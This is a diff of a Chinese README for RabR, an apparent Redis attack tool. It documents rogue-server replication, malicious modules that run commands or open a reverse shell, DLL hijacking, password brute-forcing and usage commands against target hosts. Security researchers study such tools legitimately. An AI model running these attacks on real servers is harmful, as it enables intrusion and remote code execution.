@@ -22,7 +22,7 @@ Redis从2.8开始，就支持主从复制功能。
 - 本工具默认使用的Linux恶意模块：exp.so，源码来自于：[**RedisModules-ExecuteCommand** ](https://github.com/puckiestyle/RedisModules-ExecuteCommand ), 该模块实现了执行单条命令和反弹shell的功能，你也可以编写自己的模块。  
 - 本工具默认使用的Windows恶意模块：exp.dll，源码来自于：[**RedisModules-ExecuteCommand-for-Windows** ](https://github.com/0671/RedisModules-ExecuteCommand-for-Windows ), 该模块实现了执行命令的功能，你也可以编写自己的模块。  
 - 本工具默认使用的用于劫持的恶意dll：dbghelp.dll，是通过 [**DLLHijacker** ](https://github.com/kiwings/DLLHijacker )+ **Winx64下的dbghelp.dll**编译生成的，该dll会执行calc，你可以编译自己的dbghelp.dll。
-- 本工具有爆破功能，密码字典位于pwd.txt中。  
+- 本工具有爆破功能，默认密码字典位于pwd.txt中，也可自定义字典文件。  
 - 本工具在攻击前会备份目标Redis的数据，在攻击结束后会进行恢复，使用的工具为[**redis-dump-go**](https://github.com/yannh/redis-dump-go )。默认是开启的，可以关闭。  
 
 ## 结构
@@ -34,13 +34,16 @@ Redis从2.8开始，就支持主从复制功能。
 │  rd.exe 用于保存Redis数据的程序
 │  README.md
 │  redis-attack.py 攻击主程序
+│  util 有用的程序（用于保存Redis数据）  
 ```
 
 ## 用法   
-运行环境：Windows+python3
+运行环境：python3
 ```
 usage: python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-wf WINFILE] [-lf LINUXFILE] [-a AUTH] [--brute] [-v]
-Example: python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
+Example: 
+    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
+    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -P 80 -b mypwd.txt -i
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -53,20 +56,21 @@ optional arguments:
   -P LPORT, --lport LPORT
                         rogue server listen port, default 16379
   -wf WINFILE, --winfile WINFILE
-                        Dll used to hijack redis, default dbghelp.dll
+                        Dll Used to hijack redis, default dbghelp.dll
   -wf2 WINFILE2, --winfile2 WINFILE2
-                        Redis Modules(win) to load, default exp.dll
+                        RedisModules(win) to load, default exp.dll
   -lf LINUXFILE, --linuxfile LINUXFILE
-                        Redis Modules(linux) to load, default exp.so
+                        RedisModules(linux) to load, default exp.so
   -a AUTH, --auth AUTH  redis password
-  --brute               If redis needs to verify the password, perform a brute force attack base in pwd.txt
+  -b [BRUTE], --brute [BRUTE]
+                        If redis needs to verify the password, perform a brute force attack. Dict default pwd.txt
   -i, --idontcare       don't care about the data on the target redis
   -v, --verbose         show more info
 ```
 
-![image-20210708212712502](phpto/image-20210708212712502.png)
-![image-20210708190457889](phpto/image-20210708190457889.png)
-![image-20210708213302932](phpto/image-20210708213302932.png)
+![image-20210708212712502](pic/image-20210708212712502.png)
+![image-20210708190457889](pic/image-20210708190457889.png)
+![image-20210708213302932](pic/image-20210708213302932.png)
 
 ## 进一步  
 劫持Windows x64下的dbghelp.dll的具体方法：  
@@ -79,7 +83,7 @@ optional arguments:
 4、修改项目属性的sdk版本、平台工具集为本地vs可用的值
 ```
 3）编译生成恶意dbghelp.dll，复制到本工具目录下。    
-4）使用本工具执行攻击 。  
+4）使用本工具执行攻击。  
 
 ## 时间线  
 ```  
@@ -100,4 +104,4 @@ optional arguments:
 
 ## 反馈  
 Mail：h.vi@qq.com   
-或者[issue](https://github.com/0671/RabR/issues/new)、PR  
+或者[issue](https://github.com/0671/RabR/issues/new)、PR    
